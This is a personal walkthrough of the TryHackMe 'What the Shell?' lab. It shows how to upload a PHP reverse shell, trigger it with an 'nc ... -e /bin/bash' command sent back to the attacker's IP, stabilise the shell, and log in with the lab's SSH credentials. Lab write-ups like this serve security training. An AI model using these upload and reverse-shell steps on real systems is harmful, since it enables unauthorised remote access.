# TRYHACKME : What the Shell?
***NOTE: Documented this incase I'll be using the same method to other ctf challenges.***

## Linux Shell
> Start the linux machine from **Task 14** and set up your ovpn if you're using local machine.

### Webshell
> Go to `/usr/share/webshells/php`.
> Get a copy of the file `php-reverse-shell.php`, then rename it into `rshell.php`.
>
> Open the file. Then edit the `$ip` to be your tun0 IP. You can change the `$port` or leave it as it is, which is `1234`.
>
> Open **browser** and input the http of the **target machine**.
>
> Browse the `rshell.php` and submit it. Then proceed into `uploads/` directory. Don't click `rshell.php` yet.
>
> Then into your **terminal**, open **netcat** listener: `nc -lvnp 1234`
>
> Back to your broswer, and concatenate this beside `uploads/`: `rshell.php?cmd=nc [TUN0 IP] 1234 -e /bin/bash`.
>
> Go back to terminal and you can now access the reverse shell.

### Stabilize Netcat
*Credits to [YCZHU](https://medium.com/@zycc2727/tryhackme-what-the-shell-61b54eda78e6)*
> In the reverse shell:
```
> python3 -c 'import pty;pty.spawn("/bin/bash")' // try python, python2, and python3 in order
> export TERM=xterm
// hit `ctrl + z` to bg terminal
> stty raw -echo; fg
[1] + continued nc -lvnp 1234
```

### Experiment with Bind & Reverse Netcat Shells
> Let's now proceed connecting through SSH with the given credentials:
> 
> **Username:** shell **Password:** TryH4ckM3!
```
ssh shell@[TARGET IP]
```
